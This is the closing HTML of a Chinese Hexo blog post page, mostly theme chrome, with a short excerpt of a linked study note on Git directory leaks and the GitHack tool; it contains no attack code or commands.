class="line">?&gt;</span><br></pre></td></tr></table></figure>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">xiexie</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2025/12/23/task7/">http://example.com/2025/12/23/task7/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">Hexo</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%AD%A6%E4%B9%A0task/">学习task</a></div><div class="post-share"><div class="social-share" data-image="/img/butterfly-icon.png" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/12/23/task9/" title="task9"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">task9</div></div><div class="info-2"><div class="info-item-1">信息泄露 Git泄露，Git 是分布式版本控制系统，用于跟踪文件（尤其是代码）的修改历史，方便多人协作开发和版本回滚。就相当于可以随时存档自己的开发的东西，然后假如有遇到新开发的版本有问题，可以及时做到版本回滚。每个开发者本地都有完整的版本库，.git目录就储存了整个仓库的所有版本的数据。泄漏的原因，或者说本质，就是.git被部署到了公网的web服务器上。![[Pasted image 20251120181153.png]]git的工作分为三个核心区域![[Pasted image 20251120181327.png]]那么我进行攻击的方式就是通过这个.git，用GitHack工具遍...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/12/23/task9/" title="task9"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-12-23</div><div class="info-item-2">task9</div></div><div class="info-2"><div class="info-item-1">信息泄露 Git泄露，Git 是分布式版本控制系统，用于跟踪文件（尤其是代码）的修改历史，方便多人协作开发和版本回滚。就相当于可以随时存档自己的开发的东西，然后假如有遇到新开发的版本有问题，可以及时做到版本回滚。每个开发者本地都有完整的版本库，.git目录就储存了整个仓库的所有版本的数据。泄漏的原因，或者说本质，就是.git被部署到了公网的web服务器上。![[Pasted image 20251120181153.png]]git的工作分为三个核心区域![[Pasted image 20251120181327.png]]那么我进行攻击的方式就是通过这个.git，用GitHack工具遍...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">xiexie</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">2</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/12/23/task7/" title="测试文章">测试文章</a><time datetime="2025-12-23T12:00:00.000Z" title="发表于 2025-12-23 20:00:00">2025-12-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/12/23/task9/" title="task9">task9</a><time datetime="2025-12-23T12:00:00.000Z" title="发表于 2025-12-23 20:00:00">2025-12-23</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 By xiexie</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.1</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.3</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.3"></script><script src="/js/main.js?v=5.5.3"></script><script src="/js/tw_cn.js?v=5.5.3"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.7/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@19.1.3/dist/lazyload.iife.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
